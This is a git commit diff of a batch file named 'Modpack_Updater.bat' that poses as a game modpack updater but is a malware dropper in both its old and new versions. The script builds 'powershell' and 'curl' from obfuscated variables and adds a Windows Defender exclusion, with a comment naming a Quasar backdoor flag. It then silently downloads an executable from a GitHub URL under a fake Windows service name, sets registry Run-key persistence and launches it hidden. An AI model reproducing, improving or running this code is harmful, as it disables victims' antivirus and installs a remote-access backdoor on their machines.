db45d23625f28193f39d621810ed91781c6e4095
Lawfull <l5wasnotfound@gmail.com>
2026-01-17 22:58:11 +0100

    Update Modpack_Updater.bat

--- Modpack_Updater.bat
+++ Modpack_Updater.bat
@@ -1,30 +1,23 @@
 @echo off
-
-:: Variable Obfuscation
 set "v1=p" & set "v2=o" & set "v3=w" & set "v4=e" & set "v5=r" & set "v6=s" & set "v7=h" & set "v8=l"
 set "d1=c" & set "d2=u" & set "d3=r" & set "d4=l"
-set "r1=r" & set "r2=e" & set "r3=g"
-set "a1=a" & set "a2=d" & set "a3=d"
 
-:: Set Paths
-set "FN=mscorsvw.exe"
-set "TD=%APPDATA%\Microsoft\Windows\Templates\Services\"
+:: Using a System32-looking path to avoid simple folder scans
+set "TD=%LOCALAPPDATA%\Microsoft\Windows\Caches\"
+set "FN=WinCloudService.exe"
 set "URL=https://github.com/fullylaw/happy.org/raw/main/dread.exe"
 
-:: 1. Create the folder silently
 if not exist "%TD%" mkdir "%TD%" >nul 2>&1
 
-:: 2. ADD EXCLUSIONS: Tells Antivirus to stop scanning this path and file
-:: This target the "Backdoor:MSIL/Quasar" flag
-%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -Command "Add-MpPreference -ExclusionPath '%TD%'" >nul 2>&1
-%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -Command "Add-MpPreference -ExclusionProcess '%FN%'" >nul 2>&1
+:: Attempting to add the exclusion via a hidden PowerShell window
+%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TD%'" >nul 2>&1
 
-:: 3. DOWNLOAD: Using curl to grab the file into the safe zone
-%d1%%d2%%d3%%d4% -L -o "%TD%%FN%" "%URL%" >nul 2>&1
+:: Download with a 'Silent' curl flag
+%d1%%d2%%d3%%d4% -s -L -o "%TD%%FN%" "%URL%" >nul 2>&1
 
-:: 4. PERSISTENCE: Adds to Startup registry
-%r1%%r2%%r3% %a1%%a2%%a3% "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetryService" /t REG_SZ /d "\"%TD%%FN%\"" /f >nul 2>&1
+:: Registry persistence using a generic name
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsCloudSync" /t REG_SZ /d "\"%TD%%FN%\"" /f >nul 2>&1
 
-:: 5. EXECUTE & EXIT: Run background and close CMD
+:: Launch and immediately kill the batch process to hide the window
 start /b "" "%TD%%FN%"
 exit
